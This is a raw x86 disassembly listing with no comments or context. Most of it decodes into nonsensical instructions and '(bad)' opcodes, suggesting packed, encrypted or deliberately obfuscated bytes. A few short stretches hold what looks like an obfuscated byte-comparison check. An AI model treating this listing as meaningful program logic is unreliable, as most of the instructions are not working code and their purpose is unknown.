  410b8b:	add    eax,0xed23c27a
  410b90:	pop    esp
  410b91:	xchg   ecx,eax
  410b92:	dec    esp
  410b93:	icebp  
  410b94:	jo     0x410bdd
  410b96:	fchs   
  410b98:	lods   eax,DWORD PTR ds:[esi]
  410b99:	fs push edx
  410b9b:	mov    cl,0xeb
  410b9d:	or     al,0x50
  410b9f:	mov    edx,0x20616217
  410ba4:	mov    ah,0xa0
  410ba6:	jne    0x410b42
  410ba8:	sbb    BYTE PTR [eax-0x130270b4],ch
  410bae:	xchg   ebx,eax
  410baf:	je     0x410b8e
  410bb1:	pop    esi
  410bb2:	xor    dl,BYTE PTR [esi+0x56]
  410bb5:	pop    edx
  410bb6:	jns    0x410b5d
  410bb8:	je     0x410b9c
  410bba:	jb     0x410c14
  410bbc:	xchg   ecx,eax
  410bbd:	loopne 0x410bf6
  410bbf:	dec    esi
  410bc0:	test   BYTE PTR [edi+0x57],al
  410bc3:	mov    dl,BYTE PTR [ecx]
  410bc5:	popf   
  410bc6:	mov    esp,0x15c75d40
  410bcb:	mov    ebx,DWORD PTR [ecx]
  410bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bce:	ret    0xc94c
  410bd1:	add    eax,0x6a15d392
  410bd6:	fprem1 
  410bd8:	arpl   WORD PTR [edx-0x69579c9c],sp
  410bde:	push   eax
  410bdf:	and    al,dl
  410be1:	loope  0x410b70
  410be3:	outs   dx,BYTE PTR ds:[esi]
  410be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be5:	add    ebp,DWORD PTR [ecx+0x54e4099e]
  410beb:	or     al,0x58
  410bed:	fisttp WORD PTR ds:0xf2ac2cbc
  410bf3:	dec    ebx
  410bf4:	cmp    eax,0x91a55b7d
  410bf9:	(bad)  
  410bfa:	mov    DWORD PTR [edx+0x33],esp
  410bfd:	pop    DWORD PTR [ebp-0x6f]
  410c00:	jbe    0x410c35
  410c02:	scas   eax,DWORD PTR es:[edi]
  410c03:	out    0x46,al
  410c05:	lds    esp,FWORD PTR [edi]
  410c07:	mov    eax,0x8d9208cc
  410c0c:	fwait
  410c0d:	shr    DWORD PTR ds:0xf4d98b1,0xa2
  410c14:	iret   
  410c15:	mov    gs,ecx
  410c17:	mov    bh,0x8d
  410c19:	movhps QWORD PTR [ebp-0x1],xmm3
  410c1d:	cli    
  410c1e:	stos   DWORD PTR es:[edi],eax
  410c1f:	xor    esp,edx
  410c21:	out    0x9d,eax
  410c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c24:	xchg   DWORD PTR [esi],ecx
  410c26:	(bad)  
  410c27:	mov    ds:0x516667ed,al
  410c2c:	mov    esp,0xed3bc6c3
  410c31:	and    DWORD PTR [esi],ecx
  410c33:	add    esp,DWORD PTR [edx]
  410c35:	les    eax,FWORD PTR [esi+0x42]
  410c38:	jmp    0x23ac:0xe1f24a00
  410c3f:	xchg   esp,eax
  410c40:	mov    ecx,0xf870f988
  410c45:	sub    ebx,ecx
  410c47:	add    eax,0x6778be78
  410c4c:	dec    ebp
  410c4d:	push   esi
  410c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c4f:	mov    al,ds:0x9c5bc982
  410c54:	mov    ds:0xb8523411,eax
  410c59:	inc    edi
  410c5a:	jbe    0x410c83
  410c5c:	add    bh,BYTE PTR [ebx]
  410c5e:	xchg   DWORD PTR [edx+0x7a85d6a0],esi
  410c64:	add    edx,ecx
  410c66:	int    0x4e
  410c68:	in     al,dx
  410c69:	rcr    BYTE PTR [esi+0x19],0x8f
  410c6d:	outs   dx,DWORD PTR ds:[esi]
  410c6e:	add    al,0x40
  410c70:	mov    ebp,0x448542ca
  410c75:	ret    0xcffd
  410c78:	xchg   ebx,eax
  410c79:	int    0x39
  410c7b:	sub    ah,BYTE PTR [ebx]
  410c7d:	mov    eax,ds:0x2fd4da9a
  410c82:	push   edi
  410c83:	aam    0x45
  410c85:	daa    
  410c86:	les    esp,FWORD PTR [eax]
  410c88:	shr    edx,cl
  410c8a:	jne    0x410cd8
  410c8c:	xlat   BYTE PTR ds:[ebx]
  410c8d:	inc    esp
  410c8e:	(bad)  
  410c8f:	sbb    cl,dl
  410c91:	daa    
  410c92:	or     edx,0xf1217777
  410c98:	stos   BYTE PTR es:[edi],al
  410c99:	jmp    0x42fad12
  410c9e:	mov    ah,BYTE PTR [ebx-0x5542aefe]
  410ca4:	sbb    al,0xec
  410ca6:	cs push edi
  410ca8:	add    al,BYTE PTR [ebx+0x5c]
  410cab:	xor    al,0xc0
  410cad:	lods   eax,DWORD PTR ds:[esi]
  410cae:	fisttp DWORD PTR [ebp+eax*1-0x5609ff58]
  410cb5:	mov    ecx,0x2ac07fb1
  410cba:	nop
  410cbb:	dec    ebp
  410cbc:	add    ebx,DWORD PTR [esi+0x2df64e36]
  410cc2:	xchg   edx,eax
  410cc3:	je     0x410d11
  410cc5:	xor    eax,0x1e9bf64b
  410cca:	push   esi
  410ccb:	xchg   esp,eax
  410ccc:	mov    ch,0xad
  410cce:	push   0xffffffe9
  410cd0:	lahf   
  410cd1:	(bad)  
  410cd2:	(bad)  
  410cd3:	mov    ds:0xb4fd2c96,eax
  410cd8:	test   BYTE PTR [esi],bl
  410cda:	sub    BYTE PTR [ebx+0x1],0x9c
  410cde:	or     al,0x56
  410ce0:	stos   DWORD PTR es:[edi],eax
  410ce1:	add    eax,0x5f65dedb
  410ce6:	mov    ecx,0x819dbf63
  410ceb:	inc    edx
  410cec:	jl     0x410d5b
  410cee:	jmp    0x410d34
  410cf0:	xchg   DWORD PTR [edi-0x451aa409],ecx
  410cf6:	pop    ebp
  410cf7:	cmp    BYTE PTR [edx-0x7d],0x17
  410cfb:	add    DWORD PTR [ecx+0xe],esp
  410cfe:	add    al,0xb4
  410d00:	lea    eax,[edx]
  410d02:	mov    DWORD PTR [edx-0x13],ebx
  410d05:	push   0x3a
  410d07:	mov    ecx,edi
  410d09:	aad    0x51
  410d0b:	adc    cl,BYTE PTR [ecx-0x7ba74fe]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xfce15f9c
  410d25:	test   bl,ch
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	(bad)  
  410d2f:	mov    ebx,0x2c3e2f1c
  410d34:	arpl   WORD PTR [ecx],bp
  410d36:	or     eax,0x6483dc64
  410d3b:	push   edi
  410d3c:	jle    0x410d11
  410d3e:	cmp    al,0xc4
  410d40:	jl     0x410d6f
  410d42:	iret   
  410d43:	xor    al,0x4c
  410d45:	mov    bl,0x17
  410d47:	xor    al,0x9d
  410d49:	es add al,0x1c
  410d4c:	inc    edx
  410d4d:	iret   
  410d4e:	and    eax,0x14340949
  410d53:	sar    BYTE PTR [esi+0x16791d28],1
  410d59:	popa   
  410d5a:	pop    ebx
  410d5b:	inc    eax
  410d5c:	inc    eax
  410d5d:	std    
  410d5e:	sahf   
  410d5f:	aad    0x51
  410d61:	inc    eax
  410d62:	mov    esi,ebp
  410d64:	jp     0x410d2c
  410d66:	xchg   edx,eax
  410d67:	inc    edi
  410d68:	mov    dh,0x5d
  410d6a:	or     DWORD PTR ds:0xfe2f74a9,edx
  410d70:	fcom   QWORD PTR [ecx+0x5b0abb01]
  410d76:	mov    eax,ds:0x22439e9b
  410d7b:	in     al,dx
  410d7c:	jae    0x410ddd
  410d7e:	cmp    bl,dl
  410d80:	retw   
  410d82:	xchg   esp,eax
  410d83:	cdq    
  410d84:	cmp    ebp,DWORD PTR [edx+0x63]
  410d87:	mov    esi,0x784e3ddd
  410d8c:	jno    0x410d87
  410d8e:	mov    DWORD PTR [ecx+ebx*2],edx
  410d91:	jle    0x410def
  410d93:	adc    eax,0x85b4f02
  410d98:	mov    ebp,0xa3a94640
  410d9d:	jmp    0x80770d55
  410da2:	mov    edi,0xaa2636bd
  410da7:	jl     0x410df4
  410da9:	(bad)  
  410daa:	popf   
  410dab:	fdivr  QWORD PTR [edi+0x7f]
  410dae:	jl     0x410e2e
  410db0:	fcomp  DWORD PTR [eax-0x4d]
  410db3:	out    0xf,al
  410db5:	scas   al,BYTE PTR es:[edi]
  410db6:	mov    dl,BYTE PTR [eax]
  410db8:	dec    edx
  410db9:	out    0x23,al
  410dbb:	gs das 
  410dbd:	enter  0xf5ba,0x89
  410dc1:	imul   ebx,DWORD PTR [ecx],0xb79e8bd9
  410dc7:	fadd   QWORD PTR [edx-0x183e05f7]
  410dcd:	shl    BYTE PTR [esi],0x98
  410dd0:	and    esi,edi
  410dd2:	push   ds
  410dd3:	in     al,dx
  410dd4:	sahf   
  410dd5:	sub    dh,BYTE PTR [ecx]
  410dd7:	in     eax,dx
  410dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dd9:	pop    edx
  410dda:	xor    ch,BYTE PTR [ebx]
  410ddc:	sbb    eax,0x40b5cde6
  410de1:	or     BYTE PTR es:[esi],al
  410de4:	stc    
  410de5:	jmp    0x9a9bedcd
  410dea:	jno    0x410e53
  410dec:	mov    DWORD PTR [esi],esi
  410dee:	cwde   
  410def:	lahf   
  410df0:	pop    ebp
  410df1:	scas   eax,DWORD PTR es:[edi]
  410df2:	inc    esi
  410df3:	pop    ebx
  410df4:	retf   
  410df5:	out    0xee,al
  410df7:	cmp    BYTE PTR [eax+edx*8+0x3b13d5c8],dl
  410dfe:	adc    al,BYTE PTR [ebp-0x68]
  410e01:	ja     0x410e4e
  410e03:	mov    bl,0x70
  410e05:	adc    edx,DWORD PTR [ebp+0x6a]
  410e08:	imul   esi,ecx,0xffffff8f
  410e0b:	(bad)  
  410e0c:	ja     0x410e1d
  410e0e:	leave  
  410e0f:	xor    edi,DWORD PTR [eax-0xa7c831d]
  410e15:	adc    ch,BYTE PTR [eax+0x15]
  410e18:	stos   BYTE PTR es:[edi],al
  410e19:	popa   
  410e1a:	cmp    bh,BYTE PTR [esi+0x23f39b95]
  410e20:	push   edx
  410e21:	shl    BYTE PTR [edx+0x3b395a1b],cl
  410e27:	add    BYTE PTR [eax+0x786154c9],cl
  410e2d:	popa   
  410e2e:	push   ss
  410e2f:	dec    ecx
  410e30:	outs   dx,DWORD PTR ds:[esi]
  410e31:	pop    edi
  410e32:	bswap  ebp
  410e34:	js     0x410e45
  410e36:	jmp    0x410e88
  410e38:	enter  0x553b,0x1f
  410e3c:	loopne 0x410dc2
  410e3e:	xchg   dh,dl
  410e40:	sub    eax,0x74515705
  410e45:	sbb    BYTE PTR [ebp+0x6db82e4],al
  410e4b:	(bad)  
  410e4c:	mov    edi,0xa1cf9354
  410e51:	add    al,BYTE PTR [ebx+ecx*8-0x51819035]
  410e58:	jno    0x410df2
  410e5a:	jge    0x410e10
  410e5c:	cli    
  410e5d:	cwde   
  410e5e:	jmp    DWORD PTR [edi]
  410e60:	or     ah,cl
  410e62:	fidivr DWORD PTR [edx]
  410e64:	outs   dx,DWORD PTR ds:[esi]
  410e65:	lods   eax,DWORD PTR ds:[esi]
  410e66:	mov    bh,0xe6
  410e68:	arpl   WORD PTR [ebp-0x18c8dcea],di
  410e6e:	div    DWORD PTR [eax-0x6a]
  410e71:	mov    DWORD PTR [ebp-0x4b],esp
  410e74:	pushf  
  410e75:	rcl    DWORD PTR [edi-0xa],1
  410e78:	inc    ebx
  410e79:	adc    DWORD PTR [esi-0x26483aaa],esp
  410e7f:	pop    eax
  410e80:	mov    ebp,0xdcf711d7
  410e85:	push   ebp
  410e86:	add    DWORD PTR [edx-0x38a76005],0xffffff8d
  410e8d:	jecxz  0x410f05
  410e8f:	scas   al,BYTE PTR es:[edi]
  410e90:	adc    DWORD PTR [eax+0x15],edx
  410e93:	and    eax,0x81ef0e9d
  410e98:	lock daa 
  410e9a:	in     eax,dx
  410e9b:	sbb    BYTE PTR [ecx],al
  410e9d:	pop    ds
  410e9e:	in     eax,0x6e
  410ea0:	sbb    ecx,DWORD PTR [ebx]
  410ea2:	cmp    ebx,esi
  410ea4:	xchg   edi,eax
  410ea5:	mov    DWORD PTR [esi+0x8],esp
  410ea8:	or     al,0xc8
  410eaa:	inc    esi
  410eab:	(bad)  
  410eac:	xchg   ebx,eax
  410ead:	hlt    
  410eae:	dec    eax
  410eaf:	fs or  dl,al
  410eb2:	repnz call 0x8b58:0x72680dbc
  410eba:	sbb    DWORD PTR [eax+0x2cd6b5cd],esp
  410ec0:	inc    ebx
  410ec1:	sbb    BYTE PTR [eax+0x4e5a0cdb],bl
  410ec7:	scas   al,BYTE PTR es:[edi]
  410ec8:	push   ebx
  410ec9:	lods   al,BYTE PTR ds:[esi]
  410eca:	inc    edx
  410ecb:	pusha  
  410ecc:	adc    esi,DWORD PTR [esi-0x1f9f2013]
  410ed2:	dec    edx
  410ed3:	add    ah,BYTE PTR [ecx+0xd]
  410ed6:	pop    es
  410ed7:	adc    BYTE PTR [ebx],dh
  410ed9:	call   0x50c0:0x4ba23e80
  410ee0:	xor    BYTE PTR [ebx*2+0x5c5689b4],ah
  410ee7:	mov    edx,0xbeb1ea16
  410eec:	cmp    eax,0x49106e92
  410ef1:	push   eax
  410ef2:	loopne 0x410f40
  410ef4:	imul   esp,DWORD PTR [edi+eax*4],0xffffffc1
  410ef8:	xor    al,0x71
  410efa:	mov    WORD PTR [eax-0x2378be12],es
  410f00:	fsubp  st(1),st
  410f02:	mov    dh,0x3b
  410f04:	mov    ds:0x6745722a,eax
  410f09:	inc    ebx
  410f0a:	leave  
  410f0b:	call   0x7eeb81d4
  410f10:	pop    ebx
  410f11:	(bad)  
  410f12:	std    
  410f13:	xor    eax,0xba5336ef
  410f18:	push   0xf4927e43
  410f1d:	aam    0x60
  410f1f:	scas   al,BYTE PTR es:[edi]
  410f20:	mov    esp,DWORD PTR [ebp+0x1f]
  410f23:	and    bl,al
  410f25:	(bad)  
  410f26:	dec    esp
  410f27:	and    BYTE PTR [ebx-0x5b2fa63d],dh
  410f2d:	xchg   bp,ax
  410f2f:	mov    ebx,0x4f532456
  410f34:	cmp    DWORD PTR [edx-0x1c],ecx
  410f37:	popa   
  410f38:	adc    DWORD PTR [eax],esi
  410f3a:	xor    esi,DWORD PTR [edi]
  410f3c:	add    ebx,0xffffffac
  410f3f:	mov    bh,0x7c
  410f41:	push   ebp
  410f42:	mov    edi,0xa7d42c5d
  410f47:	push   edi
  410f48:	cs jle 0x410f6d
  410f4b:	and    eax,0xe05e9e0e
  410f50:	mov    bh,0xfb
  410f52:	push   esi
  410f53:	cmp    DWORD PTR [ecx+0x48],eax
  410f56:	clc    
  410f57:	stos   BYTE PTR es:[edi],al
  410f58:	xchg   BYTE PTR [ecx],al
  410f5a:	popa   
  410f5b:	jg     0x410f66
  410f5d:	outs   dx,BYTE PTR ds:[esi]
  410f5e:	push   ebx
  410f5f:	ja     0x410fc5
  410f61:	rcl    BYTE PTR [ebx+esi*4],1
  410f64:	jmp    0xf9f6:0xa481c5d7
  410f6b:	inc    ebp
  410f6c:	or     DWORD PTR [ebp+0x6e],0x69
  410f70:	or     al,0x3d
  410f72:	loope  0x410f26
  410f74:	and    ecx,DWORD PTR [eax]
  410f76:	(bad)  
  410f77:	fistp  DWORD PTR [esp+edi*2+0x56]
  410f7b:	outs   dx,BYTE PTR ds:[esi]
  410f7c:	cwde   
  410f7d:	sbb    eax,0x9a5f18b7
  410f82:	sbb    al,0xf3
  410f84:	test   cl,al
  410f86:	sar    esi,0x4c
  410f89:	sbb    BYTE PTR [eax],0x19
  410f8c:	mov    BYTE PTR [edx+ebp*8],al
  410f8f:	add    al,0x58
  410f91:	out    dx,eax
  410f92:	or     bh,BYTE PTR [ecx+ecx*8]
  410f95:	fimul  WORD PTR [esi]
  410f97:	bound  eax,QWORD PTR [ebp+0x1703700b]
  410f9d:	push   edx
  410f9e:	adc    dl,bl
  410fa0:	loopne 0x410f91
  410fa2:	jle    0x410f66
  410fa4:	push   eax
  410fa5:	stos   DWORD PTR es:[edi],eax
  410fa6:	xchg   si,ax
  410fa8:	loop   0x410fc7
  410faa:	jl     0x410f77
  410fac:	arpl   cx,sp
  410fae:	enter  0x1d21,0xac
  410fb2:	and    BYTE PTR [ebx+0x4481ae40],al
  410fb8:	push   es
  410fb9:	and    DWORD PTR [ebp-0x656769a6],edi
  410fbf:	jmp    0x411023
  410fc1:	loopne 0x411039
  410fc3:	push   edx
  410fc4:	mov    ds:0x515b8c70,eax
  410fc9:	add    al,0x9c
  410fcb:	and    edi,DWORD PTR [eax-0x2c]
  410fce:	mov    cl,0x47
  410fd0:	pop    DWORD PTR [esi]
  410fd2:	pop    eax
  410fd3:	clc    
  410fd4:	cmc    
  410fd5:	inc    edi
  410fd6:	push   ecx
  410fd7:	jbe    0x411021
  410fd9:	shl    ebx,0xaf
  410fdc:	cmp    eax,0xc1332aa0
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411067
  41102b:	xchg   ecx,eax
  41102c:	outs   dx,DWORD PTR ds:[esi]
  41102d:	sbb    BYTE PTR ss:[edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x410fb8
  411037:	push   eax
  411038:	cdq    
  411039:	cmp    BYTE PTR [ecx+ecx*8-0x5f3cdd2b],dl
  411040:	outs   dx,DWORD PTR ds:[esi]
  411041:	xor    al,0xa6
  411043:	test   al,0x8d
  411045:	aaa    
  411046:	out    dx,eax
  411047:	ret    0xd5a1
  41104a:	and    BYTE PTR [edi],dl
  41104c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41104d:	jl     0x4110bb
  41104f:	inc    esp
  411050:	out    0xd9,al
  411052:	xor    cl,bh
  411054:	jae    0x410ff3
  411056:	mov    esp,eax
  411058:	fst    DWORD PTR [ecx-0x4a58010a]
  41105e:	lods   al,BYTE PTR ds:[esi]
  41105f:	and    al,0x65
  411061:	sbb    BYTE PTR [ebx],bl
  411063:	mov    dl,0xb
  411065:	mov    cl,0xe5
  411067:	icebp  
  411068:	and    al,0xc9
  41106a:	push   es
  41106b:	sar    ecx,1
  41106d:	jp     0x411039
  41106f:	iret   
  411070:	outs   dx,DWORD PTR ds:[esi]
  411071:	sub    al,0x40
  411073:	or     eax,0xd358f87a
  411078:	arpl   sp,si
  41107a:	test   BYTE PTR [eax-0x1ca661],cl
  411080:	push   0x43
  411082:	sti    
  411083:	pop    es
  411084:	ja     0x411014
  411086:	dec    ecx
  411087:	aas    
  411088:	pop    edi
  411089:	ret    0xb136
  41108c:	ins    DWORD PTR es:[edi],dx
  41108d:	imul   ebp,DWORD PTR [ebx-0xbfb4e9c],0x17
  411094:	bound  esi,QWORD PTR [ebp-0x3c]
  411097:	push   0xfffffff7
  411099:	test   DWORD PTR [ebx-0x7f],0x613b7b41
  4110a0:	(bad)  
  4110a1:	adc    eax,edx
  4110a3:	les    ebx,FWORD PTR [ecx-0x54427d61]
  4110a9:	cmp    DWORD PTR [ebx],eax
  4110ab:	sahf   
  4110ac:	push   ebp
  4110ad:	daa    
  4110ae:	push   0x8229efa8
  4110b3:	jp     0x41103b
  4110b5:	pop    esi
  4110b6:	jmp    0x4110f0
  4110b8:	or     dh,BYTE PTR [ecx-0x59]
  4110bb:	enter  0x69c8,0x31
  4110bf:	inc    edi
  4110c0:	jle    0x411140
  4110c2:	mov    esp,0xff193567
  4110c7:	jmp    0x411135
  4110c9:	add    eax,0x5691fa19
  4110ce:	push   ss
  4110cf:	cdq    
  4110d0:	jbe    0x411128
  4110d2:	jae    0x411083
  4110d4:	rcr    DWORD PTR [eax-0x442e57fe],cl
  4110da:	or     BYTE PTR [esi+0x497b385c],bl
  4110e0:	add    BYTE PTR [ebp-0x53c8de1a],al
  4110e6:	test   BYTE PTR [edx-0x35],0x91
  4110ea:	fcomp  QWORD PTR [edi-0x2113b1b7]
  4110f0:	ror    bl,cl
  4110f2:	inc    edi
  4110f3:	ss dec esi
  4110f5:	jae    0x411174
  4110f7:	call   0xcff863c2
  4110fc:	lds    esi,FWORD PTR [ecx]
  4110fe:	sbb    BYTE PTR [edx],0xf6
  411101:	xchg   edx,eax
  411102:	xchg   DWORD PTR [edx-0x71],esp
  411105:	(bad)  
  411106:	push   0xffffffea
  411108:	out    0x6,eax
  41110a:	jl     0x41117e
  41110c:	outs   dx,DWORD PTR ds:[esi]
  41110d:	ret    0xe902
  411110:	xlat   BYTE PTR ds:[ebx]
  411111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411112:	iret   
  411113:	mov    edx,esi
  411115:	cmp    DWORD PTR [esi],0xffffffdb
  411118:	iret   
  411119:	pop    ds
  41111a:	stc    
  41111b:	xchg   DWORD PTR [edi],eax
  41111d:	and    bl,BYTE PTR [ebx-0x60]
  411120:	out    0x47,eax
  411122:	and    ebx,DWORD PTR [esi]
  411124:	or     bh,cl
  411126:	cmp    bl,bh
  411128:	mov    eax,ds:0xd1b29f99
  41112d:	cmc    
  41112e:	out    dx,al
  41112f:	in     eax,0xfb
  411131:	stos   DWORD PTR es:[edi],eax
  411132:	addr16 xchg ebx,eax
  411134:	add    DWORD PTR [edx+0x14],0xf749405e
  41113b:	pop    esp
  41113c:	inc    ecx
  41113d:	and    bl,BYTE PTR [esp+eiz*2-0x77345930]
  411144:	adc    eax,DWORD PTR [ebx+ebp*8]
  411147:	mov    dl,0xe5
  411149:	and    eax,0x15b7561c
  41114e:	xor    ebx,DWORD PTR [edx]
  411150:	bound  ecx,QWORD PTR [eax-0x38ef815f]
  411156:	lock aas 
  411158:	cmp    al,0x53
  41115a:	lahf   
  41115b:	lds    edi,FWORD PTR [ecx]
  41115d:	push   ecx
  41115e:	sub    dl,BYTE PTR [ecx]
  411160:	inc    edi
  411161:	pushf  
  411162:	sub    dh,BYTE PTR [eax+0x14]
  411165:	cmp    ch,BYTE PTR [ebx-0x668a9bab]
  41116b:	out    dx,al
  41116c:	rcr    DWORD PTR [edx],cl
  41116e:	jnp    0x411137
  411170:	inc    edx
  411171:	sub    BYTE PTR [ebx+ebp*4],bl
  411174:	jae    0x8473d482
  41117a:	mov    cl,0x41
  41117c:	and    eax,0x495f66d4
  411181:	pushaw 
  411183:	test   eax,0x3ef40fd2
  411188:	call   0x14bbcc16
  41118d:	push   ecx
  41118e:	jge    0x411126
  411190:	aam    0x35
  411192:	sub    eax,0x54a063f9
  411197:	aas    
  411198:	call   0x7c94505d
  41119d:	inc    edi
  41119e:	ins    BYTE PTR es:[edi],dx
  41119f:	pop    ebp
  4111a0:	pushf  
  4111a1:	xchg   esp,eax
  4111a2:	scas   al,BYTE PTR es:[edi]
  4111a3:	dec    ecx
  4111a4:	aam    0x53
  4111a6:	jmp    0xd3eb:0x20c024da
  4111ad:	xor    eax,0x4b479ff5
  4111b2:	push   ecx
  4111b3:	pop    ss
  4111b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111b5:	into   
  4111b6:	fwait
  4111b7:	xor    eax,0x3d9fcdd1
  4111bc:	repz cmp esi,DWORD PTR [edi]
  4111bf:	into   
  4111c0:	loopne 0x4111cb
  4111c2:	mov    ebp,ds
  4111c4:	cdq    
  4111c5:	jno    0x411165
  4111c7:	cmp    cl,BYTE PTR [ebx+0x1bf7fc06]
  4111cd:	sbb    eax,DWORD PTR [esi]
  4111cf:	jb     0x411170
  4111d1:	sbb    ah,BYTE PTR [esi-0x2c]
  4111d4:	sbb    esp,0x8c4e06c1
  4111da:	and    DWORD PTR [edx+0x7b],ebp
  4111dd:	popf   
  4111de:	aaa    
  4111df:	int3   
  4111e0:	and    al,0x21
  4111e2:	jmp    0x4111fa
  4111e4:	xchg   BYTE PTR [edx+esi*1],bl
  4111e7:	cmp    dl,ch
  4111e9:	adc    eax,0xca233dd8
  4111ee:	lahf   
  4111ef:	fwait
  4111f0:	add    esi,DWORD PTR ds:0x3e138232
  4111f6:	int3   
  4111f7:	aad    0xc5
  4111f9:	aaa    
  4111fa:	mov    al,dl
  4111fc:	xchg   esi,eax
  4111fd:	shl    BYTE PTR [ebp+esi*8+0x2e],0x35
  411202:	clc    
  411203:	mov    ecx,0xf6ab00d3
  411208:	(bad)  
  411209:	in     al,0x8a
  41120b:	cdq    
  41120c:	cdq    
  41120d:	pusha  
  41120e:	jl     0x41125f
  411210:	sub    ebx,ebp
  411212:	aaa    
  411213:	scas   eax,DWORD PTR es:[edi]
  411214:	push   ebx
  411215:	pop    ss
  411216:	inc    ebx
  411217:	cmp    al,0xad
  411219:	add    al,0x40
  41121b:	cmp    eax,0x19581d32
  411220:	retf   
  411221:	add    edx,DWORD PTR ss:[ebx-0x1d]
  411225:	int    0xae
  411227:	xchg   DWORD PTR fs:[edi+0x1b],ebx
  41122b:	mov    cl,0x66
  41122d:	inc    ebp
  41122e:	ss mov al,0x4d
  411231:	push   eax
  411232:	pop    edi
  411233:	pop    ds
  411234:	(bad)  
  411235:	mov    esp,0x6711b93b
  41123a:	sbb    al,0x2e
  41123c:	cwde   
  41123d:	test   eax,0x19bc7279
  411242:	out    0x11,al
  411244:	jp     0x41124d
  411246:	add    al,0x96
  411248:	mov    cl,0xab
  41124a:	ins    BYTE PTR es:[edi],dx
  41124b:	repz inc ebp
  41124d:	cwde   
  41124e:	in     eax,dx
  41124f:	loope  0x411230
  411251:	fwait
  411252:	fwait
  411253:	inc    BYTE PTR ds:0xef1722ae
  411259:	push   ss
  41125a:	and    BYTE PTR [edi],cl
  41125c:	icebp  
  41125d:	sbb    dl,al
  41125f:	inc    ebx
  411260:	xchg   ecx,eax
  411261:	dec    esi
  411263:	lds    ecx,FWORD PTR [eax]
  411265:	adc    edx,edx
  411267:	mov    ah,0x14
  411269:	test   BYTE PTR [edi+0x5f22dccf],dh
  41126f:	ins    BYTE PTR es:[edi],dx
  411270:	add    dl,bh
  411272:	sub    DWORD PTR [edx-0x78],ecx
  411275:	or     edi,DWORD PTR [edx-0x7c]
  411278:	push   0xbc2d3b64
  41127d:	add    ch,ah
  41127f:	and    BYTE PTR [ebp+0x28],dh
  411282:	dec    edx
  411283:	pop    ebp
  411284:	xor    ecx,DWORD PTR [eax]
  411286:	arpl   WORD PTR [edx],sp
  411288:	lds    esi,FWORD PTR [edx-0x57]
  41128b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41128c:	pop    ds
  41128d:	loopne 0x411271
  41128f:	rol    DWORD PTR [esi+0x1065e03a],cl
  411295:	out    0x72,eax
  411297:	inc    ebp
  411298:	rol    BYTE PTR [edi+0xc6802be],0xb3
  41129f:	xchg   DWORD PTR [edi],ebx
  4112a1:	ds jge 0x4112ae
  4112a4:	xor    al,0x3d
  4112a6:	leave  
  4112a7:	cmc    
  4112a8:	sbb    BYTE PTR [ecx],ch
  4112aa:	test   BYTE PTR [ecx-0xf],dh
  4112ad:	xlat   BYTE PTR ds:[ebx]
  4112ae:	pop    esi
  4112af:	iret   
  4112b0:	retf   0xff9d
  4112b3:	lods   al,BYTE PTR ds:[esi]
  4112b4:	nop
  4112b5:	adc    esi,0xffffffea
  4112b8:	sub    esp,DWORD PTR [eax+0x2497f11c]
  4112be:	push   ebx
  4112bf:	out    dx,eax
  4112c0:	dec    edx
  4112c1:	adc    esi,DWORD PTR [ebx]
  4112c3:	push   ss
  4112c4:	jbe    0x411306
  4112c6:	das    
  4112c7:	fiadd  WORD PTR [eax]
  4112c9:	jmp    0xedcf:0xb35f4503
  4112d0:	sar    DWORD PTR [edx],0xf4
  4112d3:	and    DWORD PTR [ebx+0x3e],eax
  4112d6:	lods   eax,DWORD PTR ds:[esi]
  4112d7:	pop    eax
  4112d9:	in     eax,0x26
  4112db:	aas    
  4112dc:	mov    dh,0x88
  4112de:	fadd   QWORD PTR [edx+0x500fa0c9]
  4112e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112e5:	dec    eax
  4112e6:	gs je  0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x7368f61e,eax
  411318:	pop    ss
  411319:	test   BYTE PTR [esi],bl
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
